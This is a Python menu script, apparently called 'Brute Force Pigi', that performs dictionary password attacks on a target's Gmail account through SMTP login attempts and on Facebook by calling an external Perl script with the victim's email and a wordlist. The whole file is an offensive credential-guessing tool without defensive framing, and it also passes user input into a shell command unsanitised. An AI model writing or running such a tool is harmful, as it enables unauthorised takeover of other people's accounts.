from modele import *
import smtplib
import os
import subprocess

def gmail():
	os.system("clear")
	smtpserver = smtplib.SMTP("smtp.gmail.com",587)
	smtpserver.ehlo()
	smtpserver.starttls()

	user = input("Enter target Email adress: ")
	WordList = input("Enter the Wordlist file: ")

	if not user.endswith('@gmail.com'):
		user = user+'@gmail.com'

	if not WordList.endswith('.txt'):
		WordList = WordList+'.txt'
	print(user)
	print(WordList)
	wordlist = open(WordList,"r")
	input("Do you want to do that: [Enter]")

	for password in wordlist:
		try:
			smtpserver.login(user, password)

			print("[+] Yess! Password is found: %s"%password)
			wordlist.close()
			input()
			break
		except smtplib.SMTPAuthenticationError:
			print("[-] NOO!! Wrong Password: %s"%password)
			input()
def Facebook():
	idvictime = input("Enter the Email's victime: ")
	WordList = input("Enter the wordlist: ")
	callName = "perl facebook.pl "+idvictime+" "+WordList
	print(callName)
	subprocess.call(callName,shell=True)

	input("\nEnter to return in menu")






while(1):

	os.system("clear")
	AsciiArt()
	author()
	print("Choice Application:")
	print("  1. Gmail (Coming Later)\n  2. Facebook")
	print("\n  0. Exit Brute Force Pigi")
	ChoiceUser = input("BFP: ")
	if ChoiceUser == "1":
		gmail()
	elif ChoiceUser == "2":
		Facebook()
	elif ChoiceUser == "0":
		exit()
	else:
		print("thank you to specify an exact value\n")
		input()